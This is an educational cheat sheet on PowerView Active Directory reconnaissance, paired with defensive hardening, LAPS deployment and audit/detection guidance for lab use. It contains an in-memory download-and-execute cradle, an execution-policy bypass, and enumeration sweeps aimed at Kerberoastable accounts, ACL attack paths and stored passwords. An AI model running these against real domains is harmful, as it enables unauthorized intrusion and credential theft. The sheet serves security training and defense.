# Active Directory: PowerView and Defensive Hardening

> **⚠️ AUTHORIZED USE ONLY.** For education and authorized testing only. PowerView queries a live domain: run it only in a lab you built or a domain explicitly in scope for an authorized engagement. The hardening sections deploy real GPOs and schema changes: snapshot your DC before applying them. See the [Legal and Terms of Use](https://nishtman-k.github.io/cyber-study-hub/legal) page.

> "PowerView shows you exactly what an attacker sees when they land inside your network."

**Scope:** Using PowerView for AD enumeration from the command line: users, groups, computers, OUs, GPOs, ACLs, trusts, shares, and sessions. Paired with the defender side: hardening DCs through GPOs, deploying Windows LAPS for local admin password management, configuring auditing, and enforcing least-privilege models.

**Recommended background:** the AD Fundamentals and AD Enumeration sheets, comfort with PowerShell basics.

## Table of Contents

- [What PowerView Does](#what-powerview-does)
- [Setup](#setup)
- [Domain and Forest Enumeration](#domain-and-forest-enumeration)
- [User Enumeration](#user-enumeration)
- [Group Enumeration](#group-enumeration)
- [Computer Enumeration](#computer-enumeration)
- [OU and GPO Enumeration](#ou-and-gpo-enumeration)
- [ACL Enumeration](#acl-enumeration)
- [Trust Enumeration](#trust-enumeration)
- [Share and Session Enumeration](#share-and-session-enumeration)
- [Finding Quick Wins](#finding-quick-wins)
- [Lab: Full PowerView Recon](#lab-full-powerview-recon)
- [Hardening Domain Controllers](#hardening-domain-controllers)
- [GPO-Based Security Policies](#gpo-based-security-policies)
- [Windows LAPS](#windows-laps)
- [Lab: Deploy LAPS and Verify](#lab-deploy-laps-and-verify)
- [Auditing and Detection](#auditing-and-detection)
- [Lab: Enable Auditing and Trigger Alerts](#lab-enable-auditing-and-trigger-alerts)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. What PowerView Does

PowerView is a PowerShell script that queries Active Directory directly, no GUI, no RSAT install required. It wraps LDAP, ADSI, and WinNT queries into cmdlets that return structured objects you can filter, sort, and pipe.

| What it replaces       | How                                                        |
| ---------------------- | ---------------------------------------------------------- |
| ADUC snap-in           | `Get-DomainUser`, `Get-DomainComputer` from the CLI        |
| GPMC                   | `Get-DomainGPO`, `Get-DomainGPOLocalGroup`                 |
| Manual ACL inspection  | `Get-DomainObjectAcl` shows who controls what              |
| Session tracing        | `Get-NetSession`, `Get-NetLoggedon` for lateral movement   |
| Trust mapping          | `Get-DomainTrust`, `Get-ForestTrust`                       |

**Why attackers use it:** it runs in memory, needs no installation, and gives the same view of the domain that LDAP and BloodHound collectors use, but interactively.

**Why defenders need it:** running PowerView against your own domain is the fastest way to find what an attacker would find: over-permissioned ACLs, stale accounts, SPNs on privileged users, and shares leaking credentials.

## 2. Setup

PowerView lives in the PowerSploit framework. Load it in memory on a domain-joined Windows host.

```powershell
# download and dot-source (in-memory, nothing touches disk)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
```

If execution policy blocks you:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PowerView.ps1
```

To run as a different user (useful when you spray a password and want to query as that account):

```powershell
$pass = ConvertTo-SecureString 'User@2025!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('pentestlab.local\intern', $pass)
# then pass -Credential $cred to any PowerView cmdlet
Get-DomainUser -Credential $cred
```

Variables for this sheet (set once, reuse everywhere):

```powershell
$DC = "10.0.0.10"
$DOMAIN = "pentestlab.local"
```

## 3. Domain and Forest Enumeration

Start here: understand the domain layout before digging into objects.

```powershell
# basic domain info: name, domain controllers, forest, domain SID
Get-Domain

# all domain controllers
Get-DomainController | Select-Object Name, IPAddress, OSVersion

# forest info and child domains
Get-Forest
Get-ForestDomain
```

| Cmdlet                | Returns                                  |
| --------------------- | ---------------------------------------- |
| `Get-Domain`          | Domain name, SID, forest, DC list        |
| `Get-DomainController`| Each DC with IP, OS, roles               |
| `Get-Forest`          | Forest name, root domain, functional level|
| `Get-ForestDomain`    | Every domain in the forest               |

**Lab step:** run `Get-Domain` and note the domain SID. You will need it later for Golden Ticket forging and for comparing against BloodHound output.

```powershell
(Get-Domain).DomainSID
```

## 4. User Enumeration

Users are the primary target. PowerView gives you every LDAP attribute without writing raw LDAP filters.

```powershell
# all users, key properties
Get-DomainUser | Select-Object samaccountname, description, memberof, pwdlastset, lastlogon

# single user, full detail
Get-DomainUser -Identity svc_backup -Properties *

# users with a description set (admins leave passwords here)
Get-DomainUser | Where-Object { $_.description -ne $null } | Select-Object samaccountname, description

# users with an SPN (Kerberoastable)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# users with pre-auth disabled (AS-REP roastable)
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# disabled accounts (often overlooked, still hold data)
Get-DomainUser -UACFilter ACCOUNTDISABLE | Select-Object samaccountname, description

# accounts that have not logged in for 90 days
$cutoff = (Get-Date).AddDays(-90)
Get-DomainUser | Where-Object { $_.lastlogon -lt $cutoff } | Select-Object samaccountname, lastlogon
```

| Flag / Filter             | What it finds                          |
| ------------------------- | -------------------------------------- |
| `-SPN`                    | Accounts with a Service Principal Name |
| `-PreauthNotRequired`     | AS-REP roastable accounts              |
| `-UACFilter ACCOUNTDISABLE` | Disabled accounts                    |
| `-AdminCount`             | Accounts flagged as admin-tier         |
| `-Properties *`           | Every LDAP attribute on the object     |

**Lab step:** enumerate all users, export to CSV for offline review.

```powershell
Get-DomainUser | Select-Object samaccountname, description, memberof, serviceprincipalname, pwdlastset, lastlogon | Export-Csv -NoTypeInformation users.csv
```

## 5. Group Enumeration

Groups define who has what access. Nested groups are where privilege hides.

```powershell
# all groups
Get-DomainGroup | Select-Object samaccountname

# members of Domain Admins (recursive, catches nesting)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Select-Object MemberName

# members of a specific group
Get-DomainGroupMember -Identity "IT-Support" | Select-Object MemberName, MemberObjectClass

# which groups is a user in
Get-DomainGroup -UserName 'intern' | Select-Object samaccountname

# find groups with "admin" in the name
Get-DomainGroup -SearchTerm "admin" | Select-Object samaccountname
```

**Lab step:** compare the recursive Domain Admins membership with the non-recursive output. The difference is the nested accounts that inherit DA privileges indirectly, exactly what BloodHound visualizes as `MemberOf` edges.

```powershell
# non-recursive (direct members only)
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName

# recursive (includes nested group members)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Select-Object MemberName
```

## 6. Computer Enumeration

Know every machine, its OS, and whether you can reach it.

```powershell
# all computers
Get-DomainComputer | Select-Object dnshostname, operatingsystem, operatingsystemversion

# only servers
Get-DomainComputer -OperatingSystem "*Server*" | Select-Object dnshostname, operatingsystem

# find machines where you have local admin
Find-LocalAdminAccess

# test local admin on a specific host
Test-AdminAccess -ComputerName dc01.pentestlab.local
```

`Find-LocalAdminAccess` is noisy: it tries every machine in the domain. It is the PowerView equivalent of BloodHound's `AdminTo` edge, but live.

## 7. OU and GPO Enumeration

OUs organize objects. GPOs push settings to those objects. Both carry security implications.

```powershell
# all OUs
Get-DomainOU | Select-Object name, distinguishedname

# computers in a specific OU
Get-DomainComputer -SearchBase "OU=Servers,DC=pentestlab,DC=local" | Select-Object dnshostname

# all GPOs
Get-DomainGPO | Select-Object displayname, gpcfilesyspath

# GPOs applied to a specific computer
Get-DomainGPO -ComputerIdentity dc01.pentestlab.local | Select-Object displayname

# who has edit rights on a GPO (dangerous: GPO abuse = code execution)
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner"
} | Select-Object ObjectDN, SecurityIdentifier, ActiveDirectoryRights
```

| Cmdlet                  | Returns                                     |
| ----------------------- | ------------------------------------------- |
| `Get-DomainOU`          | OU names and distinguished names            |
| `Get-DomainGPO`         | GPO display names and SYSVOL file paths     |
| `Get-DomainGPOLocalGroup` | Local group memberships set via GPO       |

## 8. ACL Enumeration

ACLs are where the real attack paths live. PowerView resolves the raw security descriptors into readable output.

```powershell
# ACLs on a specific user (who controls this account)
Get-DomainObjectAcl -Identity bh_sysadmin -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword"
} | Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectAceType

# resolve SIDs to names
Get-DomainObjectAcl -Identity bh_sysadmin -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll"
} | ForEach-Object {
    $_ | Add-Member -NotePropertyName "Principal" -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier) -PassThru
} | Select-Object Principal, ActiveDirectoryRights

# find all objects where a specific user/group has control
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -match "helpdesk"
} | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName
```

| Right                  | What it grants                                    |
| ---------------------- | ------------------------------------------------- |
| `GenericAll`           | Full control: reset password, add SPN, everything |
| `GenericWrite`         | Write most attributes: set SPN, logon script      |
| `WriteDacl`            | Rewrite permissions: grant yourself GenericAll     |
| `WriteOwner`           | Take ownership, then grant yourself control        |
| `ForceChangePassword`  | Reset password without knowing the old one         |
| `AllExtendedRights`    | Includes DCSync when set on the domain object      |

**Lab step:** check who has `GenericAll` over the Domain Admins group. This is a critical finding.

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"
} | ForEach-Object {
    $_ | Add-Member -NotePropertyName "Principal" -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier) -PassThru
} | Select-Object Principal, ActiveDirectoryRights
```

## 9. Trust Enumeration

Trusts link domains. A trust misconfiguration can extend your reach to another domain or forest.

```powershell
# domain trusts
Get-DomainTrust

# forest trusts
Get-ForestTrust

# map all trusts with direction and type
Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType
```

| TrustDirection | Meaning                                            |
| -------------- | -------------------------------------------------- |
| `Inbound`      | The other domain trusts us (we can auth into them)  |
| `Outbound`     | We trust the other domain (they can auth into us)   |
| `Bidirectional` | Both directions                                    |

## 10. Share and Session Enumeration

Shares leak credentials. Sessions reveal where privileged users are logged in.

```powershell
# find accessible shares across the domain
Find-DomainShare -CheckShareAccess | Select-Object Name, ComputerName, Remark

# find interesting files in shares (scripts, configs, passwords)
Find-InterestingDomainShareFile -Include @('*.ps1','*.cmd','*.bat','*.vbs','*.config','*.xml','*.txt') |
    Select-Object Owner, Path

# active sessions on a machine (who is logged in where)
Get-NetSession -ComputerName dc01.pentestlab.local

# logged-on users on a machine
Get-NetLoggedon -ComputerName dc01.pentestlab.local
```

**Why sessions matter:** if a Domain Admin has an active session on a workstation you can reach, you can steal their token. BloodHound shows this as a `HasSession` edge. PowerView lets you check it live.

## 11. Finding Quick Wins

Combine the enumeration into a quick-win sweep. Run these first on any engagement.

```powershell
# 1. Kerberoastable accounts
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# 2. AS-REP roastable
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# 3. Passwords in descriptions
Get-DomainUser | Where-Object { $_.description -match "pass|pwd|cred" } | Select-Object samaccountname, description

# 4. Unconstrained delegation (machines that cache TGTs)
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# 5. Constrained delegation
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# 6. Over-broad local admin (Domain Users as local admin)
Find-LocalAdminAccess

# 7. GPP passwords in SYSVOL
Get-GPPPassword
```

## 12. Lab: Full PowerView Recon

**What you are doing:** a structured PowerView sweep of your lab domain, building the same picture BloodHound gives you, but interactively from the CLI.

**Time:** about 30 minutes. **Prerequisites:** domain-joined Windows host with PowerView loaded.

### Step 1: Load PowerView

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PowerView.ps1
```

### Step 2: Domain overview

```powershell
Get-Domain
Get-DomainController | Select-Object Name, IPAddress
(Get-Domain).DomainSID
```

### Step 3: User sweep

```powershell
Get-DomainUser | Select-Object samaccountname, description, pwdlastset | Export-Csv -NoTypeInformation users.csv
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
Get-DomainUser | Where-Object { $_.description -ne $null } | Select-Object samaccountname, description
```

### Step 4: Group and membership check

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Select-Object MemberName
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse | Select-Object MemberName
```

### Step 5: ACL sweep

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName | Export-Csv -NoTypeInformation acls.csv
```

### Step 6: Shares and sessions

```powershell
Find-DomainShare -CheckShareAccess | Select-Object Name, ComputerName
Get-NetSession -ComputerName dc01.pentestlab.local
```

### Step 7: Trusts

```powershell
Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection
```

### Step 8: Review

Open `users.csv` and `acls.csv`. Cross-reference Kerberoastable users with ACL findings. Any account that is both Kerberoastable and has high-privilege ACLs is a critical path.

---

## 13. Hardening Domain Controllers

The defensive half of this sheet. Every attack PowerView finds has a fix.

### Reduce the DC attack surface

```powershell
# check what roles and features are installed on the DC
Get-WindowsFeature | Where-Object { $_.Installed -eq $true } | Select-Object Name
```

**What should NOT be on a DC:** web server (IIS), print spooler, DNS client (if not needed), SMTP, FTP. The DC should run AD DS, DNS Server, and as little else as possible.

```powershell
# disable the print spooler (used in PrintNightmare, relay attacks)
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

### Disable SMBv1

```powershell
# check current SMB versions
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol

# disable SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# verify
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
```

### Enforce SMB signing

```powershell
# via registry (or push through GPO, Section 14)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1
```

### Restrict LDAP signing

```powershell
# require LDAP signing on the DC
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 2
```

## 14. GPO-Based Security Policies

GPOs are the enforcement mechanism. These are the policies that block the techniques PowerView finds.

### Password policy

**Path:** `Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Password Policy`

| Setting                      | Recommended value      |
| ---------------------------- | ---------------------- |
| Minimum password length      | 14 characters          |
| Password history             | 24 passwords remembered|
| Maximum password age         | 60 days                |
| Complexity requirements      | Enabled                |

### Account lockout

**Path:** `... > Account Lockout Policy`

| Setting                   | Recommended value     |
| ------------------------- | --------------------- |
| Lockout threshold         | 5 invalid attempts    |
| Lockout duration          | 30 minutes            |
| Reset counter after       | 30 minutes            |

### Restrict privileged logons

**Path:** `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment`

| Setting                            | Recommended value                |
| ---------------------------------- | -------------------------------- |
| Deny log on locally                | Block DA accounts on workstations|
| Deny log on through RDP            | Block DA accounts on workstations|
| Allow log on locally (on DCs)      | Domain Admins only               |

### AppLocker (block unauthorized scripts)

**Path:** `Computer Configuration > Policies > Windows Settings > Security Settings > Application Control Policies > AppLocker`

Block unsigned PowerShell scripts and executables in user-writable paths. This directly prevents PowerView from loading.

```powershell
# verify AppLocker is running
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

### Restrict NTLM

**Path:** `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`

| Setting                              | Value                  |
| ------------------------------------ | ---------------------- |
| Network security: Restrict NTLM: Incoming NTLM traffic | Deny all accounts |
| Network security: Restrict NTLM: NTLM authentication in this domain | Deny all |

## 15. Windows LAPS

LAPS solves one of the oldest AD problems: every machine sharing the same local admin password. When one machine is compromised, the attacker moves laterally with that shared password. LAPS gives every machine a unique, rotating local admin password stored in AD.

### How it works

1. A GPO tells each machine to rotate its local admin password on a schedule.
2. The machine generates a random password and writes it to its own computer object in AD (the `msLAPS-Password` attribute).
3. Only authorized users/groups can read the password.
4. After the password expires, the machine generates a new one.

### Setup: extend the AD schema

Run on the DC as Schema Admin:

```powershell
# Windows LAPS (built into Server 2022+ and Windows 11 April 2023+)
Update-LapsADSchema -Verbose
```

### Grant machines permission to write their own password

```powershell
# for the Workstations OU (adjust to your OU structure)
Set-LapsADComputerSelfPermission -Identity "OU=Workstations,DC=pentestlab,DC=local"
```

### Grant a group permission to read LAPS passwords

```powershell
# create security groups
New-ADGroup -Name 'LAPS-Admins' -GroupCategory Security -GroupScope Global
New-ADGroup -Name 'LAPS-ReadOnly' -GroupCategory Security -GroupScope Global

# grant read permission
Set-LapsADReadPasswordPermission -Identity "OU=Workstations,DC=pentestlab,DC=local" -AllowedPrincipals 'LAPS-Admins','LAPS-ReadOnly'

# grant reset permission (force a new password)
Set-LapsADResetPasswordPermission -Identity "OU=Workstations,DC=pentestlab,DC=local" -AllowedPrincipals 'LAPS-Admins'
```

### Configure the LAPS GPO

Create a new GPO linked to the Workstations OU. Navigate to: `Computer Configuration > Policies > Administrative Templates > System > LAPS`

| Setting                                | Value                      |
| -------------------------------------- | -------------------------- |
| Configure password backup directory    | Active Directory           |
| Password Settings                      | Complexity: large+small+numbers+specials, Length: 20, Age: 30 days |
| Name of administrator account to manage | `Administrator` (or your custom name) |
| Enable password encryption             | Enabled                    |

### Retrieve a LAPS password

```powershell
Get-LapsADPassword -Identity "WORKSTATION01" -AsPlainText
```

### Verify on the client

```powershell
# force a group policy update
gpupdate /force

# check LAPS events
Get-WinEvent -LogName "Microsoft-Windows-LAPS/Operational" -MaxEvents 10
```

## 16. Lab: Deploy LAPS and Verify

**What you are doing:** setting up LAPS end to end and confirming the password rotates.

**Time:** about 20 minutes. **Prerequisites:** DC (Server 2022+ or patched 2019), one domain-joined client.

### Step 1: Extend schema

```powershell
Update-LapsADSchema -Verbose
```

### Step 2: Set permissions

```powershell
Set-LapsADComputerSelfPermission -Identity "OU=Workstations,DC=pentestlab,DC=local"
```

### Step 3: Create and link the GPO

Use GPMC: create "LAPS-Policy", link to the Workstations OU, configure as in Section 15.

### Step 4: Force update on the client

```powershell
gpupdate /force
```

### Step 5: Read the password from the DC

```powershell
Get-LapsADPassword -Identity "CLIENT01" -AsPlainText
```

Expected: a long random password and an expiration timestamp.

### Step 6: Test the password

```powershell
# from Kali, verify the LAPS password works
netexec smb <client_ip> -u Administrator -p '<LAPS_password>' --local-auth
```

### Step 7: Wait for rotation

After the configured age expires, re-run `Get-LapsADPassword`. The password should be different.

### Cleanup

Remove the GPO link from the OU if you want to disable LAPS for the lab.

## 17. Auditing and Detection

Enable these audit policies to detect the PowerView enumeration and ACL abuse techniques from this sheet.

### Essential audit policies (via GPO)

**Path:** `Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration`

| Category                   | Subcategory                     | Setting       | Detects                      |
| -------------------------- | ------------------------------- | ------------- | ---------------------------- |
| Account Logon              | Audit Kerberos Authentication   | Success, Fail | Kerberoasting, AS-REP        |
| Account Logon              | Audit Kerberos Service Ticket   | Success, Fail | TGS requests (4769)          |
| DS Access                  | Audit Directory Service Access  | Success       | LDAP enumeration (4662)      |
| Object Access              | Audit SAM                       | Success       | User/group enumeration       |
| Account Management         | Audit User Account Management  | Success       | Password resets (4724)        |
| Logon/Logoff               | Audit Logon                     | Success, Fail | Spraying (4625), lateral (4624) |
| Policy Change              | Audit Policy Change             | Success       | GPO modifications            |

### PowerShell logging

```powershell
# enable Script Block Logging via registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# enable Module Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
```

Script Block Logging captures the full text of every PowerShell script that runs, including PowerView. It writes to Event ID **4104**.

### Key detection signals

| Attack                | Event ID | Signal                                              |
| --------------------- | -------- | --------------------------------------------------- |
| PowerView loading     | 4104     | Script block containing `Get-DomainUser`, `PowerView` |
| LDAP enumeration      | 4662     | Bulk directory object access                         |
| Password spray        | 4625     | Many accounts, same password, one failure each       |
| ACL modification      | 4670, 5136 | Permissions changed on a sensitive object           |
| Kerberoasting         | 4769     | RC4 encryption type (0x17)                          |
| AS-REP Roasting       | 4768     | Pre-auth type 0                                     |
| DCSync                | 4662     | Replication GUID from a non-DC                      |
| LAPS password read    | 4662     | Access to `msLAPS-Password` attribute                |

## 18. Lab: Enable Auditing and Trigger Alerts

**What you are doing:** enabling audit policies, then running PowerView to generate the detection events.

**Time:** about 15 minutes.

### Step 1: Enable auditing via GPO

Apply the audit policies from Section 17 to the Default Domain Controllers Policy.

### Step 2: Enable PowerShell logging

```powershell
# on the DC
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

### Step 3: Run PowerView enumeration

```powershell
. .\PowerView.ps1
Get-DomainUser
Get-DomainGroupMember -Identity "Domain Admins"
```

### Step 4: Check the event logs

```powershell
# PowerShell script block logs (4104) mentioning PowerView
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 20 |
    Where-Object { $_.Message -match "DomainUser|PowerView" } |
    Select-Object TimeCreated, Message | Format-List

# directory access (4662)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662} -MaxEvents 10 | Select-Object TimeCreated, Message
```

Expected: 4104 events showing the full PowerView commands. This is what a SOC analyst sees.

### Step 5: Correlate

Match the 4104 timestamps to the 4662 directory access events. The pair, script loading plus bulk LDAP queries, is the detection signature for PowerView enumeration.

## 19. Fast Recall

- **PowerView queries AD from PowerShell** without RSAT or a GUI. Load it in memory with `. .\PowerView.ps1`.
- **`Get-DomainUser -SPN`** finds Kerberoastable accounts. **`-PreauthNotRequired`** finds AS-REP roastable.
- **`Get-DomainObjectAcl -ResolveGUIDs`** reveals who controls what. Filter for `GenericAll`, `WriteDacl`, `WriteOwner`.
- **`Find-InterestingDomainAcl`** sweeps all ACLs for dangerous permissions, the PowerView equivalent of BloodHound's edge analysis.
- **`Get-DomainGroupMember -Recurse`** catches nested group membership that grants hidden admin.
- **`Find-LocalAdminAccess`** tests which machines you can admin. Noisy but definitive.
- **`Get-NetSession`** shows who is logged in where: find DA sessions on reachable machines.
- **`Find-DomainShare -CheckShareAccess`** finds readable shares. **`Find-InterestingDomainShareFile`** finds files with passwords.
- **Harden DCs:** disable Print Spooler, disable SMBv1, enforce SMB signing and LDAP signing, remove unnecessary roles.
- **GPO hardening:** 14-char minimum password, lockout after 5 attempts, restrict DA logon to DCs only, deploy AppLocker.
- **LAPS gives every machine a unique local admin password** stored in AD. Schema extend, set permissions, link a GPO, done.
- **`Get-LapsADPassword -Identity "PC" -AsPlainText`** retrieves the LAPS password.
- **Script Block Logging (4104)** captures every PowerShell command including PowerView. Enable it.
- **4662 + replication GUID from a non-DC** detects DCSync. **4769 with RC4 (0x17)** detects Kerberoasting.
- **Defenders should run PowerView against their own domain** regularly. If you can find it, so can an attacker.

## 20. Resources

**PowerView**

- [PowerView (PowerSploit dev branch)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- [PowerView 3.0 tips and tricks (HarmJ0y)](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- [HackTricks: PowerView](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)

**Active Directory hardening**

- [Microsoft: Best Practices for Securing AD](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
- [Microsoft: Securing Domain Controllers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/securing-domain-controllers-against-attack)
- [Microsoft: Least-Privilege Administrative Models](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models)

**GPO and AppLocker**

- [Microsoft: Group Policy Overview](https://learn.microsoft.com/en-us/windows-server/networking/group-policy/group-policy-overview)
- [Microsoft: AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/appcontrol-and-applocker-overview)

**Windows LAPS**

- [Microsoft: What is Windows LAPS?](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [Microsoft: Get started with LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [Microsoft: Configure LAPS policy settings](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-policy-settings)
- [Microsoft: Key concepts in LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts)

**SMB hardening**

- [Microsoft: Detect, enable and disable SMBv1, v2, v3](https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3)
- [Microsoft: Secure Administrative Hosts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-secure-administrative-hosts)

**Detection**

- [Microsoft: Security auditing overview](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview)
- [CISA: Detecting and mitigating AD compromises](https://www.cisa.gov/resources-tools/resources/detecting-and-mitigating-active-directory-compromises)

**Related sheets**

- Active Directory Fundamentals, for the object model and ACL concepts
- Active Directory Enumeration and Credential Abuse, for the Linux-side tools (ldapsearch, impacket) that complement PowerView
- Active Directory BloodHound, for the graph-based analysis that PowerView feeds into
